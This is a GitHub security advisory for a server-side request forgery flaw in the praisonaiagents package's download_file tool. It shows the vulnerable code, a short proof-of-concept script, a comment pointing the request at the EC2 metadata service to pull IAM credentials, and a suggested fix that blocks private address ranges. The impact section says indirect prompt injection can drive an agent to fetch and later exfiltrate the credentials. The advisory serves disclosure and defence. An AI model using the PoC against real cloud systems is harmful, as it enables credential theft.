# [H] PraisonAI Has SSRF in FileTools.download_file() via Unvalidated URL

## Summary
Severity: High
Advisory: GHSA-44c2-3rw4-5gvh
CVE: CVE-2026-34954
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-44c2-3rw4-5gvh
Type: github-advisory

## Affected
- PyPI: `praisonaiagents` — affected >=0 <1.5.95

## Details
### Summary

`FileTools.download_file()` in `praisonaiagents` validates the destination path but performs no validation on the `url` parameter, passing it directly to `httpx.stream()` with `follow_redirects=True`. An attacker who controls the URL can reach any host accessible from the server including cloud metadata services and internal network services.

### Details

`file_tools.py:259` (source) -> `file_tools.py:296` (sink)
```python
# source -- url taken directly from caller, no validation
def download_file(self, url: str, destination: str, ...):

# sink -- unvalidated url passed to httpx with redirect following
    with httpx.stream("GET", url, timeout=timeout, follow_redirects=True) as response:
```

### PoC
```bash
# tested on: praisonaiagents==1.5.87 (source install)
# install: pip install -e src/praisonai-agents
# start listener: python3 -m http.server 8888

import os
os.environ['PRAISONAI_AUTO_APPROVE'] = 'true'
from praisonaiagents.tools.file_tools import download_file

result = download_file(
    url="http://127.0.0.1:8888/ssrf-test",
    destination="/tmp/ssrf_out.txt"
)
print(result)
# listener logs: "GET /ssrf-test HTTP/1.1" 404
# on EC2 with IMDSv1: url="http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# writes IAM credentials to destination file
```

### Impact

On cloud infrastructure with IMDSv1 enabled, an attacker can retrieve IAM credentials via the EC2 metadata service and write them to disk for subsequent agent steps to exfiltrate. `follow_redirects=True` enables open-redirect chaining to bypass partial URL filters. Reachable via indirect prompt injection with no authentication required.

### Suggested Fix
```python
from urllib.parse import urlparse
import ipaddress

BLOCKED_NETWORKS = [
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
]

def _validate_url(url: str) -> None:
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        raise ValueError(f"Scheme {parsed.scheme!r} not allowed")
    try:
        addr = ipaddress.ip_address(parsed.hostname)
        for net in BLOCKED_NETWORKS:
            if addr in net:
                raise ValueError(f"Requests to {addr} are not permitted")
    except ValueError as e:
        if "does not appear to be" not in str(e):
            raise
```

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-44c2-3rw4-5gvh
- https://nvd.nist.gov/vuln/detail/CVE-2026-34954
- https://github.com/MervinPraison/PraisonAI
